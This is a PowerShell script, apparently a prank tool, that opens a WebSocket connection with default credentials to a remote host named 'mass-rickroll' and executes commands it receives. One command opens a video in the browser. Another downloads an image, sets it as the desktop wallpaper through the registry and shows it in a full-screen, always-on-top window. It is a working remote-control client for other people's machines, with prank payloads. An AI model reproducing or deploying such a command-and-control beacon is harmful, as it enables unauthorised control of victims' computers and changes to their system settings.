Try {
    
    Do {
        $URL = 'ws://mass-rickroll.host.qrl.nz';
        $WS = New-Object System.Net.WebSockets.ClientWebSocket;
        $CT = New-Object System.Threading.CancellationToken;
        $WS.Options.UseDefaultCredentials = $true;
        $Conn = $WS.ConnectAsync($URL, $CT);
        While (!$Conn.IsCompleted) { ; Start-Sleep -Milliseconds 100; };
        Write-Host "Connected to $($URL)";
        $Size = 1024;
        $Array = [byte[]] @(, 0) * $Size;
        While ($WS.State -eq 'Open') {
            $Recv = New-Object System.ArraySegment[byte] -ArgumentList @(, $Array);
            $Conn = $WS.ReceiveAsync($Recv, $CT);
            While (!$Conn.IsCompleted) { ; Start-Sleep -Milliseconds 100; };
            $Command = [System.Text.Encoding]::utf8.GetString($Recv.array);
            Write-Host $Command;
            if ($Command -eq 'rick') {
                Start-Process 'https://www.youtube.com/watch?v=o-YBDTqX_ZU&ab_channel=MusRest'
            }
            elseif ($Command -eq 'blue') {
                if (-not(Test-Path -Path $env:USERPROFILE\GetLobstered.jpg -PathType Leaf)) {
                    Invoke-WebRequest "https://cloudfront-us-east-1.images.arcpublishing.com/advancelocal/OF2RNL3XZZFB5B2PLE7R3RBIBE.jpeg" -OutFile  $env:USERPROFILE\GetLobstered.jpg;
                }
                Write-Host "BLUEEE";
                Set-ItemProperty -path "HKCU:\Control Panel\Desktop\" -name wallpaper -value $env:USERPROFILE\GetLobstered.jpg
                rundll32.exe user32.dll, UpdatePerUserSystemParameters
                # Start-Process "mspaint" -ArgumentList $env:USERPROFILE\GetLobstered.jpg -WindowStyle maximized;
                Add-Type -AssemblyName 'System.Windows.Forms'
                $file = (get-item $env:USERPROFILE\GetLobstered.jpg)
                $img = [System.Drawing.Image]::Fromfile((get-item $file))

                [System.Windows.Forms.Application]::EnableVisualStyles()
                $form = new-object Windows.Forms.Form
                $form.Text = "Blue Lobster."
                $form.Width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;
                $form.Height =  [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height;
                $pictureBox = new-object Windows.Forms.PictureBox
                $pictureBox.Width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width;
                $pictureBox.Height =   [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height;

                $pictureBox.Image = $img;
                $pictureBox.SizeMode =  [System.Windows.Forms.PictureBoxSizeMode]::Zoom;
                $form.controls.add($pictureBox);
                $topmost = New-Object 'System.Windows.Forms.Form' -Property @{TopMost=$true};
                $form.Add_Shown( { $form.Activate() } );
                # $form.ShowDialog($topmost);
                Start-Sleep 0.5;
                $form.ShowDialog($topmost);
            } else {
                Write-Host "Unkown Command"
            }
        };
    } Until ($WS.State -ne 'Open') 
}
Finally {
    If ($WS) {
        Write-Host "Closing websocket";
        $WS.Dispose();
    }
}